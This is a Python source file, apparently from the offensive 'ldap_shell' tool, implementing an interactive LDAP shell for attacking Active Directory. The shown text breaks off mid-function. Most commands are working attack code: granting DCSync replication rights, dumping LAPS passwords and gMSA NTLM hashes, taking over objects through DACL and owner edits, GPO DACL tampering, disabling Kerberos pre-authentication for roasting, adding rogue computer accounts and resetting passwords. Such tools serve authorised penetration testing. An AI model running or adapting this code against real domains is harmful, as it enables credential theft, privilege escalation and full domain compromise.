import binascii
import copy
import getpass
import hashlib
import logging
import random
import re
import shlex
import string
from struct import pack, unpack
from Cryptodome.Hash import MD4

import OpenSSL
import ldap3
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.common.data.DNWithBinary import DNWithBinary
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from dsinternals.system.DateTime import DateTime
from dsinternals.system.Guid import Guid
from ldap3.core.results import RESULT_UNWILLING_TO_PERFORM
from ldap3.protocol.formatters.formatters import format_sid
from ldap3.protocol.microsoft import security_descriptor_control
from ldap3.utils.conv import escape_filter_chars
from minikerberos.common.ccache import CCACHE
from minikerberos.common.target import KerberosTarget
from minikerberos.network.clientsocket import KerberosClientSocket

from ldap_shell.utils import ldaptypes
from ldap_shell.prompt import Prompt
from ldap_shell.myPKINIT import myPKINIT
from ldap_shell.helper import Helper
from ldap_shell.structure import MSDS_MANAGEDPASSWORD_BLOB
from ldap_shell.ldap_modules.dump.ldap_module import LdapShellModule

import importlib
import os

log = logging.getLogger('ldap-shell.shell')

# noinspection PyMissingOrEmptyDocstring,PyPep8Naming,PyUnusedLocal
class LdapShell(Prompt):
    LDAP_MATCHING_RULE_IN_CHAIN = '1.2.840.113556.1.4.1941'
    def __init__(self, domain_dumper, client, noninteractive=False):
        super().__init__(domain_dumper, client)
        current_user = client.user.split('\\')[1]
        self.noninteractive = noninteractive
        self.prompt = f'\n{current_user}# '
        self.tid = None
        self.loggedIn = True
        self.client = client
        self.domain_dumper = domain_dumper
        self.helper = Helper()

    def process_error_response(self):
        if self.client.result['result'] == 50:
            raise Exception(
                f'Could not modify object, the server reports insufficient rights: {self.client.result["message"]}')
        elif self.client.result['result'] == 19:
            raise Exception(
                f'Could not modify object, the server reports a constrained violation: {self.client.result["message"]}')
        else:
            raise Exception(f'The server returned an error: {self.client.result["message"]}')

    def emptyline(self) -> bool:
        pass

    def onecmd(self, line: str) -> bool:
        ret_val = False
        # noinspection PyBroadException
        try:
            ret_val = super().onecmd(line)
        except Exception:
            log.error('Failed to execute onecmd()', exc_info=True)
        if self.client.authentication == 'NTLM':
            self.client.rebind()
        return ret_val

    @staticmethod
    def bin_to_string(uuid):
        uuid1, uuid2, uuid3 = unpack('<LHH', uuid[:8])
        uuid4, uuid5, uuid6 = unpack('>HHL', uuid[8:16])
        return '%08X-%04X-%04X-%04X-%04X%08X' % (uuid1, uuid2, uuid3, uuid4, uuid5, uuid6)

    @staticmethod
    def string_to_bin(uuid):
        # If a UUID in the 00000000-0000-0000-0000-000000000000 format, parse it as Variant 2 UUID
        # The first three components of the UUID are little-endian, and the last two are big-endian
        matches = re.match(
            r"([\dA-Fa-f]{8})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})([\dA-Fa-f]{8})",
            uuid)
        (uuid1, uuid2, uuid3, uuid4, uuid5, uuid6) = [int(x, 16) for x in matches.groups()]
        uuid = pack('<LHH', uuid1, uuid2, uuid3)
        uuid += pack('>HHL', uuid4, uuid5, uuid6)
        return uuid

    @staticmethod
    def calculate_ntlm (password):
        return binascii.hexlify(hashlib.new("md4", password.encode("utf-16le")).digest()).decode()

    @staticmethod
    def create_empty_sd():
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
        sd['Revision'] = b'\x01'
        sd['Sbz1'] = b'\x00'
        sd['Control'] = 32772
        sd['OwnerSid'] = ldaptypes.LDAP_SID()
        # BUILTIN\Administrators
        sd['OwnerSid'].fromCanonical('S-1-5-32-544')
        sd['GroupSid'] = b''
        sd['Sacl'] = b''
        acl = ldaptypes.ACL()
        acl['AclRevision'] = 4
        acl['Sbz1'] = 0
        acl['Sbz2'] = 0
        acl.aces = []
        sd['Dacl'] = acl
        return sd

    @staticmethod
    def createACE(sid, object_type=None, access_mask=983551): # 983551 Full control
        nace = ldaptypes.ACE()
        nace['AceFlags'] = 0x00

        if object_type is None:
            acedata = ldaptypes.ACCESS_ALLOWED_ACE()
            nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
        else:
            nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
            acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
            acedata['ObjectType'] = LdapShell.string_to_bin(object_type)
            acedata['InheritedObjectType'] = b''
            acedata['Flags'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT

        acedata['Mask'] = ldaptypes.ACCESS_MASK()
        acedata['Mask']['Mask'] = access_mask

        if type(sid) is str:
            acedata['Sid'] = ldaptypes.LDAP_SID()
            acedata['Sid'].fromCanonical(sid)
        else:
            acedata['Sid'] = sid

        nace['Ace'] = acedata
        return nace

    @staticmethod
    def create_allow_ace(sid):
        nace = ldaptypes.ACE()
        nace['AceType'] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
        nace['AceFlags'] = 0x00
        acedata = ldaptypes.ACCESS_ALLOWED_ACE()
        acedata['Mask'] = ldaptypes.ACCESS_MASK()
        acedata['Mask']['Mask'] = 983551  # Full control
        acedata['Sid'] = ldaptypes.LDAP_SID()
        acedata['Sid'].fromCanonical(sid)
        nace['Ace'] = acedata
        return nace

    def do_write_gpo_dacl(self, line):
        args = shlex.split(line)
        log.info('Adding %s to GPO with GUID %s', args[0], args[1])
        if len(args) != 2:
            raise Exception('A samaccountname and GPO sid are required.')

        tgtUser = args[0]
        gposid = args[1]
        self.client.search(self.domain_dumper.root, f'(&(objectclass=person)(sAMAccountName={tgtUser}))',
                           attributes=['objectSid'])
        if len(self.client.entries) <= 0:
            raise Exception('Given user not found')

        user = self.client.entries[0]

        controls = security_descriptor_control(sdflags=0x04)
        self.client.search(self.domain_dumper.root, f'(&(objectclass=groupPolicyContainer)(name={gposid}))',
                           attributes=['objectSid', 'nTSecurityDescriptor'], controls=controls)

        if len(self.client.entries) <= 0:
            raise Exception('Given gpo not found')
        gpo = self.client.entries[0]

        secDescData = gpo['nTSecurityDescriptor'].raw_values[0]
        secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
        newace = self.create_allow_ace(str(user['objectSid']))
        secDesc['Dacl']['Data'].append(newace)
        data = secDesc.getData()

        self.client.modify(gpo.entry_dn, {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [data])}, controls=controls)
        if self.client.result["result"] == 0:
            log.info('LDAP server claims to have taken the secdescriptor. Have fun')
        else:
            raise Exception(f'Something went wrong: {self.client.result["description"]}')

    def do_add_computer(self, line):
        args = shlex.split(line)

        if not self.client.tls_started and not self.client.server.ssl:
            log.info('Sending StartTLS command...')
            if not self.client.start_tls():
                log.error("StartTLS failed")
                return log.error('Error adding a new computer with LDAP requires LDAPS. Try -use-ldaps flag')
            else:
                log.info('StartTLS succeded!')

        if len(args) != 1 and len(args) != 2:
            raise Exception('Expected a computer name and an optional password argument.')

        computer_name = args[0]
        if not computer_name.endswith('$'):
            computer_name += '$'

        log.info('Attempting to add a new computer with the name: %s', computer_name)

        if len(args) == 1:
            password = ''.join(
                random.choice(string.ascii_letters + string.digits) for _ in range(25))
        else:
            password = args[1]

        domain_dn = self.domain_dumper.root
        domain = re.sub(',DC=', '.', domain_dn[domain_dn.find('DC='):], flags=re.I)[3:]

        log.info('Inferred Domain DN: %s', domain_dn)
        log.info('Inferred Domain Name: %s', domain)

        computer_hostname = computer_name[:-1]  # Remove $ sign
        computer_dn = f"CN={computer_hostname},CN=Computers,{self.domain_dumper.root}"
        log.info('New Computer DN: %s', computer_dn)

        spns = [
            f'HOST/{computer_hostname}',
            f'HOST/{computer_hostname}.{domain}',
            f'RestrictedKrbHost/{computer_hostname}',
            f'RestrictedKrbHost/{computer_hostname}.{domain}',
        ]
        ucd = {
            'dnsHostName': f'{computer_hostname}.{domain}',
            'userAccountControl': 4096,
            'servicePrincipalName': spns,
            'sAMAccountName': computer_name,
            'unicodePwd': '"{}"'.format(password).encode('utf-16-le')
        }

        res = self.client.add(computer_dn, ['top', 'person', 'organizationalPerson', 'user', 'computer'], ucd, security_descriptor_control(sdflags=0x04))

        if not res:
            if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM:
                log.error('Failed to add a new computer. The server denied the operation.')
            else:
                log.error('Failed to add a new computer: %s', self.client.result)
        else:
            log.info('Adding new computer with username "%s" and password "%s" result: OK', computer_name, password)

    def do_hello_(self, line):
        log.info('Hello, world!{}'.format(line))

    def do_hello(self, line):
        m = LdapShellModule(line, log=log)
        m()

#    def do_test_del_computer(self, line):
#        m = HelloModule(
#            param='test', 
#            log=log
#        )
#        m()

    def do_del_computer(self, line):
        args = shlex.split(line)

        if len(args) != 1 and len(args) != 2:
            raise Exception('Expected a computer name and an optional password argument.')

        computer_name = args[0]
        if not computer_name.endswith('$'):
            computer_name += '$'

        log.info('Attempting to del a computer with the name: %s', computer_name)

        domain_dn = self.domain_dumper.root
        domain = re.sub(',DC=', '.', domain_dn[domain_dn.find('DC='):], flags=re.I)[3:]

        log.info('Inferred Domain DN: %s', domain_dn)
        log.info('Inferred Domain Name: %s', domain)

        computer_hostname = computer_name[:-1]  # Remove $ sign
        computer_dn = f"CN={computer_hostname},CN=Computers,{self.domain_dumper.root}"
        log.info('Del Computer DN: %s', computer_dn)

        res = self.client.delete(computer_dn)

        if not res:
            if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM:
                log.error('Failed to del a computer. The server denied the operation.')
            else:
                log.error('Failed to del a computer: %s', self.client.result)
        else:
            log.info('Deleting computer with name "%s" result: OK', computer_name)

    def do_add_user(self, line):
        if not self.client.server.ssl:
            return log.error('Error adding a new computer with LDAP requires LDAPS. Try -use-ldaps flag')
        args = shlex.split(line)
        if len(args) == 0:
            raise Exception('A username is required.')

        new_user = args[0]
        parent_dn = f'CN=Users,{self.domain_dumper.root}'
        
        if len(args) > 1:
            new_password = args[1]
        else:
            new_password = ''.join(
                random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))

        self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(new_user)})', attributes=['objectSid'])
        if len(self.client.entries) != 0:
            raise Exception(f'Failed add user: user {new_user} already exists!')


        new_user_dn = f'CN={new_user},{parent_dn}'
        ucd = {
            'objectCategory': f'CN=Person,CN=Schema,CN=Configuration,{self.domain_dumper.root}',
            'distinguishedName': new_user_dn,
            'cn': new_user,
            'sn': new_user,
            'givenName': new_user,
            'displayName': new_user,
            'name': new_user,
            'userAccountControl': 512,
            'accountExpires': '0',
            'sAMAccountName': new_user,
            'unicodePwd': '"{}"'.format(new_password).encode('utf-16-le')
        }

        log.info('Attempting to create user in: %s', parent_dn)
        res = self.client.add(new_user_dn, ['top', 'person', 'organizationalPerson', 'user'], ucd)
        if not res:
            if self.client.result['result'] == RESULT_UNWILLING_TO_PERFORM and not self.client.server.ssl:
                raise Exception(
                    'Failed to add a new user. The server denied the operation.'
                    ' Try relaying to LDAP with TLS enabled (ldaps) or escalating an existing user.')
            else:
                raise Exception(f'Failed to add a new user: {self.client.result["description"]}')
        else:
            log.info('Adding new user with username "%s" and password "%s" result: OK', new_user, new_password)

    def do_add_user_to_group(self, line):
        user_name, group_name = shlex.split(line)

        user_dn = self.get_dn(user_name)
        if not user_dn:
            raise Exception(f'User not found in LDAP: {user_name}')

        group_dn = self.get_dn(group_name)
        if not group_dn:
            raise Exception(f'Group not found in LDAP: {group_name}')

        user_name = user_dn.split(',')[0][3:]
        group_name = group_dn.split(',')[0][3:]

        res = self.client.modify(group_dn, {'member': [(ldap3.MODIFY_ADD, [user_dn])]})
        if res:
            log.info('Adding user "%s" to group "%s" result: OK', user_name, group_name)
            if self.client.authentication == 'ANONYMOUS' and self.client.user.split('\\')[1].lower() == user_name.lower():
                log.info('You use kerberos auth and change self groups. Please, create new ticket and reconnect ldap_shell.')
        else:
            raise Exception(f'Failed to add user to group "{group_name}": {self.client.result["description"]}')

    def do_del_user(self, line):
        args = shlex.split(line)
        if len(args) < 1:
            log.error("Enter the user to be deleted.")
            return

        user_name = args[0]
        user_dn = self.get_dn(user_name)
        if not user_dn:
            raise Exception(f'User not found in LDAP: {user_name}')

        user_name = user_dn.split(',')[0][3:]

        res = self.client.delete(user_dn)
        if res:
            log.info('Delete user "%s" result: OK', user_name)
        else:
            raise Exception(f'Failed to delete user: {self.client.result["description"]}')

    def do_del_user_from_group(self, line):
        user_name, group_name = shlex.split(line)

        user_dn = self.get_dn(user_name)
        if not user_dn:
            raise Exception(f'User not found in LDAP: {user_name}')

        group_dn = self.get_dn(group_name)
        if not group_dn:
            raise Exception(f'Group not found in LDAP: {group_name}')

        user_name = user_dn.split(',')[0][3:]
        group_name = group_dn.split(',')[0][3:]

        res = self.client.modify(group_dn, {'member': [(ldap3.MODIFY_DELETE, [user_dn])]})
        if res:
            log.info('Delete user "%s" from group "%s" result: OK', user_name, group_name)
        else:
            raise Exception(f'Failed to delete user from group "{group_name}": {self.client.result["description"]}')


    def do_change_password(self, line):
        if not self.client.tls_started and not self.client.server.ssl:
            log.info('Sending StartTLS command...')
            if not self.client.start_tls():
                log.error("StartTLS failed")
                return log.error('Error change password with LDAP requires LDAPS. Try -use-ldaps flag')
            else:
                log.info('StartTLS succeded!')

        args = shlex.split(line)

        if len(args) != 1 and len(args) != 2:
            raise Exception(
                f'Expected a username and an optional password argument. Instead {len(args)} arguments were provided')

        user_dn = self.get_dn(args[0])
        log.info('Got User DN: %s', user_dn)

        if len(args) == 1:
            password = ''.join(
                random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
        else:
            password = args[1]

        log.info('Attempting to set new password of: %s', password)
        self.client.extend.microsoft.modify_password(user_dn, password)

        if self.client.result['result'] == 0:
            log.info('Password changed successfully!')
        else:
            self.process_error_response()

    def do_clear_rbcd(self, computer_name):
        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(computer_name)})',
                                     attributes=['objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
        if not success or len(self.client.entries) != 1:
            raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')

        target = self.client.entries[0]
        target_sid = target['objectsid'].value
        log.info('Found Target DN: %s', target.entry_dn)
        log.info('Target SID: %s', target_sid)

        sd = self.create_empty_sd()

        self.client.modify(target.entry_dn,
                           {'msDS-AllowedToActOnBehalfOfOtherIdentity': [ldap3.MODIFY_REPLACE, [sd.getData()]]})
        if self.client.result['result'] == 0:
            log.info('Delegation rights cleared successfully!')
        else:
            self.process_error_response()

    def do_dump(self, line):
        log.info('Dumping domain info...')
        self.stdout.flush()
        self.domain_dumper.domainDump()
        log.info('Domain info dumped into lootdir (%s)!', self.domain_dumper.config.basepath.resolve())

    def do_disable_account(self, username):
        self.toggle_account_enable_disable(username, False)

    def do_enable_account(self, username):
        self.toggle_account_enable_disable(username, True)

    def toggle_account_enable_disable(self, user_name, enable):
        UF_ACCOUNT_DISABLE = 2
        self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(user_name)})',
                           attributes=['objectSid', 'userAccountControl'])

        if len(self.client.entries) != 1:
            raise Exception(f'Error expected only one search result got {len(self.client.entries)} results')

        user_dn = self.client.entries[0].entry_dn

        if not user_dn:
            raise Exception(f'User not found in LDAP: {user_name}')

        entry = self.client.entries[0]
        userAccountControl = entry['userAccountControl'].value

        log.info('Original userAccountControl: %s', userAccountControl)

        if enable:
            userAccountControl = userAccountControl & ~UF_ACCOUNT_DISABLE
        else:
            userAccountControl = userAccountControl | UF_ACCOUNT_DISABLE

        self.client.modify(user_dn, {'userAccountControl': (ldap3.MODIFY_REPLACE, [userAccountControl])})

        if self.client.result['result'] == 0:
            log.info('Updated userAccountControl attribute successfully')
        else:
            self.process_error_response()

    def do_search(self, line):
        arguments = shlex.split(line)
        if len(arguments) == 0:
            raise Exception('A query is required.')

        attributes = []
        if len(arguments) > 1:
            # Split remaining arguments on both commas and spaces
            attr_string = ' '.join(arguments[1:])
            attributes.extend([attr.strip() for attr in re.split(r'[,\s]+', attr_string) if attr.strip()])
        else:
            attributes = None

        search_query = '{}'.format(arguments[0])
        log.debug('search_query={}'.format(search_query))
        log.debug('attributes={}'.format(attributes))
        self.search('(|{})'.format(search_query), *attributes if attributes else None)

    def do_set_dontreqpreauth(self, line):
        UF_DONT_REQUIRE_PREAUTH = 4194304

        args = shlex.split(line)
        if len(args) != 2:
            raise Exception('Username (SAMAccountName) and true/false flag required (e.g. jsmith true).')

        user_name = args[0]
        flag_str = args[1]

        if "true" == flag_str.lower():
            flag = True
        elif flag_str.lower() == 'false':
            flag = False
        else:
            raise Exception('The specified flag must be either true or false')

        self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(user_name)})',
                           attributes=['objectSid', 'userAccountControl'])
        if len(self.client.entries) != 1:
            raise Exception(f'Expected only one search result, got {len(self.client.entries)} results')

        user_dn = self.client.entries[0].entry_dn
        if not user_dn:
            raise Exception(f'User not found in LDAP: {user_name}')

        entry = self.client.entries[0]
        userAccountControl = entry['userAccountControl'].value
        log.info('Original userAccountControl: %s', userAccountControl)

        if flag:
            userAccountControl = userAccountControl | UF_DONT_REQUIRE_PREAUTH
        else:
            userAccountControl = userAccountControl & ~UF_DONT_REQUIRE_PREAUTH

        log.info('Updated userAccountControl: %s', userAccountControl)
        self.client.modify(user_dn, {'userAccountControl': (ldap3.MODIFY_REPLACE, [userAccountControl])})

        if self.client.result['result'] == 0:
            log.info('Updated userAccountControl attribute successfully')
        else:
            self.process_error_response()

    def do_get_user_groups(self, user_name):
        user_dn = self.get_dn(user_name)
        if not user_dn:
            raise Exception(f'User not found in LDAP: {user_name}')

        self.search(f'(member:{LdapShell.LDAP_MATCHING_RULE_IN_CHAIN}:={escape_filter_chars(user_dn)})')

    def do_get_group_users(self, group_name):
        group_dn = self.get_dn(group_name)
        if not group_dn:
            raise Exception(f'Group not found in LDAP: {group_name}')

        self.search(f'(memberof:{LdapShell.LDAP_MATCHING_RULE_IN_CHAIN}:={escape_filter_chars(group_dn)})',
                    'sAMAccountName', 'name')

    def do_get_laps_gmsa(self, line):
        args = shlex.split(line)

        if not self.client.tls_started and not self.client.server.ssl:
            log.info('Sending StartTLS command...')
            if not self.client.start_tls():
                log.error("StartTLS failed")
                return log.error('Error adding a new computer with LDAP requires LDAPS. Try -use-ldaps flag')
            else:
                log.info('StartTLS succeded!')

        if len(args) != 0 and len(args) != 1:
            raise Exception(
                f'Expecting target. Received {len(args)} arguments instead.'
            )
        #====LAPS=====
        if len(args) == 0:
            self.client.search(self.domain_dumper.root, f'(ms-MCS-AdmPwd=*)',
                               attributes=['ms-MCS-AdmPwd','sAMAccountName'])
            if len(self.client.entries) == 0:
                log.error(f'This user can\'t read LAPS')
            else:
                for e in self.client.entries:
                    print('[LAPS]', e['sAMAccountName'], e['ms-MCS-AdmPwd'])
        else:
            self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(args[0])})',
                               attributes=['ms-MCS-AdmPwd'])
            if len(self.client.entries) != 1:
                log.error(f'Error expected only one search result got {len(self.client.entries)} results')

            computer = self.client.entries[0]
            log.info('Found Computer DN: %s', computer.entry_dn)

            password = computer['ms-MCS-AdmPwd'].value

            if password is not None:
                log.info('LAPS Password: %s', password)
            else:
                log.error('Unable to Read LAPS Password for Computer')
        #=====GMSA=====
        self.client.search(self.domain_dumper.root, f'(&(ObjectClass=msDS-GroupManagedServiceAccount))',
                           attributes=['sAMAccountName','msDS-ManagedPassword','msDS-GroupMSAMembership'])
        if len(self.client.entries) == 0:
            print('No gMSAs returned.')
            return
        for entry in self.client.entries:
            sam = entry['sAMAccountName'].value
            if 'msDS-ManagedPassword' in entry and entry['msDS-ManagedPassword']:
                data = entry['msDS-ManagedPassword'].raw_values[0]
                blob = MSDS_MANAGEDPASSWORD_BLOB()
                blob.fromString(data)
                currentPassword = blob['CurrentPassword'][:-2]
                ntlm_hash = MD4.new()
                ntlm_hash.update(currentPassword)
                passwd = binascii.hexlify(ntlm_hash.digest()).decode("utf-8")
                print(f'[GMSA] {sam}:::aad3b435b51404eeaad3b435b51404ee:{passwd}')
                return

    def do_set_genericall(self, line):
        args = shlex.split(line)

        if len(args) != 1 and len(args) != 2:
            raise Exception(
                f'Expecting target and grantee names for DACL modified. Received {len(args)} arguments instead.'
            )

        controls = security_descriptor_control(sdflags=0x04)

        target_name = args[0]
        grantee_name = args[1]

        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(target_name)})',
                                     attributes=['objectSid', 'nTSecurityDescriptor'], controls=controls)
        if len(self.client.entries) == 0:
            #Try modify root
            log.info('Not found user, try modify root')
            success = self.client.search(self.domain_dumper.root, '(objectClass=*)', attributes=['objectSid', 'nTSecurityDescriptor'],
                               controls=controls)
        if not success:
            raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')

        target = self.client.entries[0]
        target_sid = target['objectSid'].value
        log.info('Found Target DN: %s', target.entry_dn)
        log.info('Target SID: %s', target_sid)

        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(grantee_name)})',
                                     attributes=['objectSid'])
        if not success or len(self.client.entries) != 1:
            raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')

        grantee = self.client.entries[0]
        grantee_sid = grantee['objectSid'].value
        log.info('Found Grantee DN: %s', grantee.entry_dn)
        log.info('Grantee SID: %s', grantee_sid)

        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target['nTSecurityDescriptor'].raw_values[0])
        except IndexError:
            sd = self.create_empty_sd()

        sd['Dacl'].aces.append(self.create_allow_ace(grantee_sid))
        self.client.modify(target.entry_dn, {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, [sd.getData()]]},
                           controls=controls)

        if self.client.result['result'] == 0:
            log.info('DACL modified successfully! %s now has control of %s', grantee_name, target_name)
            if self.client.authentication == 'ANONYMOUS' and self.client.user.split('\\')[1].lower() == grantee.entry_dn.split(',')[0].split('=')[1].lower():
                log.info('For the changes to take effect, please restart ldap_shell.') 
        else:
            self.process_error_response()

    def do_set_dcsync(self, user_name):
        self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(user_name)})',
                           attributes=['objectSid' ])
        if len(self.client.entries) != 1:
            raise Exception(f'Expected only one search result, got {len(self.client.entries)} results')

        user_sid = self.client.entries[0]['objectSid'].value
        user_dn = self.client.entries[0].entry_dn

        if not user_dn:
            raise Exception(f'User not found in LDAP: {user_name}')

        ldap_attribute = 'nTSecurityDescriptor'
        target_dn = self.domain_dumper.root
        self.client.search(target_dn, '(objectClass=*)', attributes=ldap_attribute, controls=security_descriptor_control(sdflags=0x04))

        if len(self.client.entries) <= 0:
            raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')

        entry_dn = self.client.entries[0].entry_dn
        sd_data = self.client.entries[0][ldap_attribute].raw_values

        if len(sd_data) < 1:
            raise Exception(f'Check if user {user_name} have write access to the domain object')
        else:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data[0])

        old_sd = sd
        attr_values = []

        sd['Dacl'].aces.append(self.createACE(sid=user_sid, object_type='1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')) #set DS-Replication-Get-Changes-All
        sd['Dacl'].aces.append(self.createACE(sid=user_sid, object_type='1131f6aa-9c07-11d1-f79f-00c04fc2dcd2')) #set DS-Replication-Get-Changes
        sd['Dacl'].aces.append(self.createACE(sid=user_sid, object_type='89e95b76-444d-4c62-991a-0facbeda640c')) #set DS-Replication-Get-Changes-In-Filtered-Set

        if len(sd['Dacl'].aces) > 0:
            attr_values.append(sd.getData())
        self.client.modify(entry_dn, {ldap_attribute: [ldap3.MODIFY_REPLACE, attr_values]}, controls=security_descriptor_control(sdflags=0x04))

        if self.client.result['result'] == 0:
            log.info('DACL modified successfully! %s now has DS-Replication privilege and can perform DCSync attack!', user_name)
        else:
            self.process_error_response()

    def do_del_dcsync(self, user_name):
        self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(user_name)})',
                           attributes=['objectSid' ])
        if len(self.client.entries) != 1:
            raise Exception(f'Expected only one search result, got {len(self.client.entries)} results')

        user_sid = self.client.entries[0]['objectSid'].value
        user_dn = self.client.entries[0].entry_dn

        if not user_dn:
            raise Exception(f'User not found in LDAP: {user_name}')

        ldap_attribute = 'nTSecurityDescriptor'
        target_dn = self.domain_dumper.root
        self.client.search(target_dn, '(objectClass=*)', attributes=ldap_attribute, controls=security_descriptor_control(sdflags=0x04))

        if len(self.client.entries) <= 0:
            raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')

        entry_dn = self.client.entries[0].entry_dn
        sd_data = self.client.entries[0][ldap_attribute].raw_values

        if len(sd_data) < 1:
            raise Exception(f'Check if user {user_name} have write access to the domain object')
        else:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data[0])

        old_sd = sd
        attr_values = []
        new_aces = []
        dc_sync_attr_bin = [LdapShell.string_to_bin(e) for e in ['1131f6ad-9c07-11d1-f79f-00c04fc2dcd2','1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','89e95b76-444d-4c62-991a-0facbeda640c']]

        for e in sd['Dacl'].aces:
            if e['Ace']['Sid'].formatCanonical() == user_sid:
                try:
                    if not e['Ace']['ObjectType'] in dc_sync_attr_bin:
                        new_aces.append(e)
                except:
                    new_aces.append(e)
            else:
                new_aces.append(e)

        sd['Dacl'].aces = new_aces

        if len(sd['Dacl'].aces) > 0 or ldap_attribute == 'nTSecurityDescriptor':
            attr_values.append(sd.getData())
        self.client.modify(entry_dn, {ldap_attribute: [ldap3.MODIFY_REPLACE, attr_values]}, controls=security_descriptor_control(sdflags=0x04))

        if self.client.result['result'] == 0:
            log.info('DACL modified successfully! %s now has no DS-Replication privilege.', user_name)
        else:
            self.process_error_response()

    def do_set_owner(self, line):
        args = shlex.split(line)

        if len(args) == 1:
            grantee_name = self.client.user.split('\\')[1]
        elif len(args) == 2:
            grantee_name = args[1]
        else:
            raise Exception(
                f'Expecting target and Owner name for Owner modified. Received {len(args)} arguments instead.'
            )

        controls = security_descriptor_control(sdflags=0x04)
        target_name = args[0]
        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(target_name)})',
                                     attributes=['objectSid', 'nTSecurityDescriptor'], controls=controls)

        if not success:
            raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')

        target = self.client.entries[0]
        target_sid = target['objectSid'].value
        log.info('Found Target DN: %s', target.entry_dn)
        log.info('Target SID: %s', target_sid)

        success = self.client.search(self.domain_dumper.root, f'(sAMAccountName={escape_filter_chars(grantee_name)})',
                                     attributes=['objectSid'])
        if not success or len(self.client.entries) != 1:
            raise Exception(f'Error expected only one search result, got {len(self.client.entries)} results')

        grantee = self.client.entries[0]
        grantee_sid = grantee['objectSid'].value
        log.info('Found Grantee DN: %s', grantee.entry_dn)
        log.info('Grantee SID: %s', grantee_sid)
        OWNER_SECURITY_INFORMATION = 0x00000001
        try:
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=target['nTSecurityDescriptor'].raw_values[0])
        except IndexError:
            sd = self.create_empty_sd()

        entry_dn = target.entry_dn

        controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=OWNER_SECURITY_INFORMATION)
        attr_values = []

        sd['OwnerSid'] = ldaptypes.LDAP_SID()
        sd['OwnerSid'].fromCanonical(format_sid(grantee_sid))
        attr_values.append(sd.getData())

        self.client.modify(entry_dn, {'nTSecurityDescriptor': [ldap3.MODIFY_REPLACE, attr_values]}, controls=controls)
        if self.client.result['result'] == 0:
            log.info('DACL modified successfully! %s now Owner of %s!', grantee_name, target_name)
            if self.client.authentication == 'ANONYMOUS' and self.client.user.split('\\')[1].lower() == grantee.entry_dn.split(',')[0].split('=')[1].lower():
                log.info('For the changes to take effect, please restart ldap_shell.') 
        else:
            self.process_error_response()

    def do_dacl_modify(self, line):
        masks = {
            "genericwrite":0x20034,                    #GENERIC_WRITE and RESET_PASSWORD
            "allextendedrights":0x20134,               #ADS_RIGHT_DS_CONTROL_ACCESS
            "genericall":0xF01FF,                      #GENERIC_ALL(0x10000000)
            "writeowner":0xa0034,                      #WRITE_OWNER
            "writedacl":0x60034,                       #WRITE_DACL
            "writeproperty":0x20034,                   #ADS_RIGHT_DS_WRITE_PROP
            "delete":0x30034}                          #DELETE

        objects = {
            'writetorbcd':'3F78C3E5-F79A-46BD-A0B8-9D18116DDC79',       #ms-DS-AllowedToActOnBehalfOfOtherIdentity
            'writetokeycredlink':'5B47D60F-6090-40B2-9F37-2A4DE88F3063' #ms-Ds-KeyCredentialLink
        }
        object = None
        args = shlex.split(line)
        if len(args) != 4:
            raise Exception(
                f'Expecting target, grantee, add/del and mask name or ObjectType for ACE modified. Received {len(args)} arguments instead.'
            )
        controls = security_descriptor_control(sdflags=0x04)

        target_name = args[0]
        grantee_name = args[1]
        flag_str = args[2]
        if flag_str.lower() == "add":
            flag = True
        elif flag_str.lower() == "del":
            flag = False
        else:
            raise Exception('The specified flag must be either true or false')
        mask = args[3]
        if mask.lower() in masks:
            mask=masks[mask.lower()]
        elif mask.lower() in objects:
            object = objects[mask.lower()]
            mask = None
        elif all(c in string.hexdigits+'x' for c in mask):
            mask = int(mask,16)
        elif re.fullmatch(r"([\dA-Fa-f]{8})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})-([\dA-Fa-f]{4})([\dA-Fa-f]{8})", mask) is not None:
            object = mask
            mask = None
        else:
            raise Exception('Mask or object not specified, use <GenericAll, GenericWrite, WriteOwner...> or '
